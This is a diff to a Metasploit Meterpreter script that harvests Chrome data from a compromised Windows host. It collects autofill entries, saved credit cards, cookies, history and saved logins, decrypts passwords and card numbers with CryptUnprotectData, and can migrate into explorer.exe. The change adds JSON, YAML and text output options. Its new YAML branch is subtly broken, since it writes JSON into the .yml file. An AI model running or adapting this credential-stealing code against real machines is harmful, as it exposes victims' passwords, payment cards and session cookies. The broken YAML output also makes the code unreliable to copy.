@@ -5,7 +5,7 @@
 #
 
 require 'sqlite3'
-require 'json'
+require 'yaml'
 
 if client.platform !~ /win32/
 	print_error("This version of Meterpreter is not supported with this Script!")
@@ -13,27 +13,40 @@ if client.platform !~ /win32/
 end
 
 @chrome_files = [
-	{ :in_file => "Web Data", :sql => "select * from autofill;", :out_file => "autofill.json"},
-	{ :in_file => "Web Data", :sql => "select * from autofill_profiles;", :out_file => "autofill_profiles.json"},
-	{ :in_file => "Web Data", :sql => "select * from credit_cards;", :out_file => "autofill_credit_cards.json", :encrypted_fields => ["card_number_encrypted"]},
-	{ :in_file => "Cookies", :sql => "select * from cookies;", :out_file => "cookies.json"},
-	{ :in_file => "History", :sql => "select * from urls;", :out_file => "history.json"},
-	{ :in_file => "Login Data", :sql => "select * from logins;", :out_file => "logins.json", :encrypted_fields => ["password_value"]},
+	{ :in_file => "Web Data", :sql => "select * from autofill;", :out_file => "autofill"},
+	{ :in_file => "Web Data", :sql => "select * from autofill_profiles;", :out_file => "autofill_profiles"},
+	{ :in_file => "Web Data", :sql => "select * from credit_cards;", :out_file => "autofill_credit_cards", :encrypted_fields => ["card_number_encrypted"]},
+	{ :in_file => "Cookies", :sql => "select * from cookies;", :out_file => "cookies"},
+	{ :in_file => "History", :sql => "select * from urls;", :out_file => "history"},
+	{ :in_file => "Login Data", :sql => "select * from logins;", :out_file => "logins", :encrypted_fields => ["password_value"]},
 	{ :in_file => "Bookmarks", :sql => nil, :out_file => "bookmarks.json"},
 	{ :in_file => "Preferences", :sql => nil, :out_file => "preferences.json"},
 ]
-migrate = false
-old_pid = nil
+@migrate = false
+@old_pid = nil
+@output_format = []
 
 opts = Rex::Parser::Arguments.new(
 	"-h" => [ false, "Help menu" ],
-	"-m" => [ false, "Migrate into explorer.exe"]
+	"-m" => [ false, "Migrate into explorer.exe"], 
+	"-f" => [ true, "Output format: j[son], y[aml], t[ext]. Defaults to json"]
 )
 
 opts.parse(args) { |opt, idx, val|
 	case opt
 	when "-m"
-		migrate = true
+		@migrate = true
+	when "-f"
+		if val =~ /^j(son)?$/
+			@output_format << "json" 
+		elsif val =~ /^y(aml)?$/
+			@output_format << "yaml"
+		elsif val =~ /^t(ext)?$/
+			@output_format << "text"
+		else
+			print_error("unknown format '#{val}'.")
+			raise Rex::Script::Completed
+		end
 	when "-h"
 		print_line("")
 		print_line("USAGE: run enum_chrome [-m]")
@@ -42,22 +55,25 @@ opts.parse(args) { |opt, idx, val|
 	end
 }
 
+@output_format << "json" if @output_format.empty?
+if @output_format.include?("json")
+	begin
+		require 'json'
+	rescue LoadError
+		print_error("JSON is not available.")
+		@output_format.delete("json") 
+		if @output_format.empty?
+			print_status("Falling back to raw text output.")
+			@output_format << "text" 
+		end
+	end
+end
+print_status("using output format(s): " + @output_format.join(", "))
+
 def prepare_railgun
 	rg = client.railgun
 	if (!rg.get_dll('crypt32'))
 		rg.add_dll('crypt32')
-	end
-
-	if (!rg.crypt32.functions["CryptProtectData"])
-		rg.add_function("crypt32", "CryptProtectData", "BOOL", [
-			["PBLOB","pDataIn", "in"],
-			["PWCHAR", "szDataDescr", "in"],
-			["PBLOB", "pOptionalEntropy", "in"],
-			["PDWORD", "pvReserved", "in"],
-			["PBLOB", "pPromptStruct", "in"],
-			["DWORD", "dwFlags", "in"],
-			["PBLOB", "pDataOut", "out"]
-		])
 	end
 
 	if (!rg.crypt32.functions["CryptUnprotectData"])
@@ -89,11 +105,25 @@ def decrypt_data(data)
 	decrypted = process.memory.read(addr, len)
 end
 
+def write_output(file, rows)
+	if @output_format.include?("json")
+		::File.open(file + ".json", "w") { |f| f.write(JSON.pretty_generate(rows)) }
+	end
+	if @output_format.include?("yaml")
+		::File.open(file + ".yml", "w") { |f| f.write(JSON.pretty_generate(rows)) }
+	end
+	if @output_format.include?("text")
+		::File.open(file + ".txt", "w") do |f| 
+			f.write(rows.first.keys.join("\t") + "\n")
+			f.write(rows.map { |e| e.values.map(&:inspect).join("\t") }.join("\n"))
+		end
+	end
+end
+
 def process_files(username)
 	@chrome_files.each do |item|
 		in_file = File.join(@log_dir, username, item[:in_file])
 		out_file = File.join(@log_dir, username, item[:out_file])
-		print_status("creating file '#{item[:out_file]}'...")
 		if item[:sql]
 			db = SQLite3::Database.new(in_file)
 			columns, *rows = db.execute2(item[:sql])
@@ -108,7 +138,12 @@ def process_files(username)
 				end
 				res
 			end
-			::File.open(out_file, "w") { |f| f.write(JSON.pretty_generate(rows)) }
+			if rows.length > 0
+				print_status("writing output '#{item[:out_file]}'...")
+				write_output(out_file, rows)
+			else
+				print_status("no '#{item[:out_file]}' data found in file '#{item[:in_file]}'")
+			end
 		else
 			::FileUtils.cp(in_file, out_file)
 		end
@@ -133,11 +168,11 @@ def extract_data(username)
 	return true
 end
 
-if migrate
+if @migrate
 	current_pid = client.sys.process.open.pid
 	target_pid = client.sys.process["explorer.exe"]
 	if target_pid != current_pid
-		old_pid = current_pid
+		@old_pid = current_pid
 		print_status("current PID is #{current_pid}. migrating into explorer.exe, PID=#{target_pid}...")
 		client.core.migrate(target_pid)
 		print_status("done.")
@@ -178,9 +213,9 @@ usernames.each do |u|
 	process_files(u) if success
 end
 
-if migrate && old_pid
-		print_status("migrating back into PID=#{old_pid}...")
-		client.core.migrate(old_pid)
+if @migrate && @old_pid
+		print_status("migrating back into PID=#{@old_pid}...")
+		client.core.migrate(@old_pid)
 		print_status("done.")
 end
 
